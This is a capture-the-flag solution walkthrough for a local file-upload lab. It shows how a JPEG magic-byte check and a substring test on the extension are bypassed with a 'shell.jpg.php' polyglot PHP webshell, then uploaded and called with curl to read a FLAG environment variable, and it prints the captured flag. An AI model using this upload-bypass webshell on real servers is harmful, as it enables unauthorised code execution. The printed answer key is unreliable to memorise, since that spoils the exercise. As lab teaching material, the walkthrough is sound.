# SOLUTION — elder (walkthrough, spoilers + flag)

Attack Drills series · `upload/` · entry `http://127.0.0.1:18945`.
Commands assume the shot is armed and reachable on `127.0.0.1`
(`cp .env.example .env && docker compose up -d --build`). The flag value
below is the field-verified run's value, reproduced exactly as captured
(flags are public by policy; your own `FLAG` build arg will differ).

---

1. The uploader demands a JPG: magic bytes must start `ffd8` **and** the
   name must *contain* `.jpg` or `.jpeg` (`strpos`, not `endswith`). The
   check never looks at what the file *ends* with — and uploads land in
   `upload/`, which Apache serves with PHP enabled.

2. Build a file that is a JPEG by the first two bytes and PHP by its final
   extension:

   ```bash
   printf '\xff\xd8<?php echo getenv("FLAG"); ?>' > shell.jpg.php
   curl -s -F "userfile=@shell.jpg.php" http://127.0.0.1:18945/index.php
   ```

   (`shell.jpg.php` contains `.jpg` ✓, starts `ffd8` ✓ — and Apache runs
   it because the *last* extension is `.php`.)

3. Fetch the webshell — the flag is not on disk, it's the container
   environment (upstream hint: *"Check environment variables"*):

   ```bash
   curl -s http://127.0.0.1:18945/upload/shell.jpg.php
   ```

   ```
   FLAG{xbow_elder_035640f528bc8422e0ee8ad5}}
   ```

> Field note: `printenv` / `phpinfo()` also work from the shell; the flag
> is exposed via `ENV FLAG` in the image, so filesystem hunting finds
> nothing.

---


---

## Flag (field-verified run)

```
FLAG{xbow_elder_035640f528bc8422e0ee8ad5}}
```

Location: container env var `FLAG`.
